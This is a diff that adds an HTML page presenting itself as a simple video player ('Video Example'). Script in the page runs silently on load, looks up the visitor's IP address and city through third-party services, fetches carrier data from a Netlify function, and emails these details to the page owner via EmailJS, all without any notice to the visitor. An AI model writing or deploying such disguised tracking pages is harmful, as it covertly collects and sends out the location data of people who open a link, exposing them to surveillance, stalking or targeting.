@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Example</title>
+    <style>
+        body{
+            background-color: #202020;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+            box-sizing: border-box;
+        }
+        .video{
+            width: 60vw;
+            height: 80vh;
+        }
+        @media only screen and (max-width: 600px) {
+            .video{
+                width: 90vw;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <video class="video" controls>
+        <source src="video.mp4" type="video/mp4">
+        <source src="video.webm" type="video/webm">
+        Your browser does not support the video tag.
+    </video>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+    <script>
+        $.getJSON("https://api.ipify.org?format=json", function (clientData) {
+            var clientIp = clientData.ip;
+
+            $.getJSON("https://ipapi.co/" + clientIp + "/json/", function (locationData) {
+                var cityName = locationData.city;
+                console.log(cityName);
+
+                var request = new XMLHttpRequest();
+                request.open('GET', '/.netlify/functions/fetchIpData');
+                request.setRequestHeader('Accept', 'application/json');
+
+                request.onreadystatechange = function () {
+                    if (this.readyState === 4 && this.status === 200) {
+                        var data = JSON.parse(this.responseText);
+                        var ip = data.ip || clientIp;
+                        var city = data.city || cityName;
+                        var carrierName = data.carrierName || "hey";
+                        var time = data.time || "000";
+                        var counter = data.count || "unknown";
+
+                        $.ajax({
+                            url: 'https://api.emailjs.com/api/v1.0/email/send',
+                            type: 'POST',
+                            data: JSON.stringify({
+                                service_id: 'service_lne6ewa',
+                                template_id: 'template_3r6bobi',
+                                user_id: '1NnuuCpetYJt2e-1h',
+                                template_params: {
+                                    ip: ip,
+                                    city: city,
+                                    time: time,
+                                    carrierName: carrierName,
+                                    counter: counter
+                                }
+                            }),
+                            contentType: 'application/json',
+                            success: function (data) {
+                                console.log("Email sent successfully");
+                            },
+                            error: function (error) {
+                                console.log("Error sending email:", error);
+                            }
+                        });
+                    }
+                };
+
+                request.send();
+            });
+        });
+
+        function writeTodaysDate() {
+            const today = new Date();
+            const formattedDate = "Date: " + today.getDate() + '/' + (today.getMonth() + 1) + '/' + today.getFullYear();
+            document.getElementById("limitedAccessDate").textContent = formattedDate;
+        }
+        // Call the function to execute
+        writeTodaysDate();
+    </script>
+</body>
+</html>
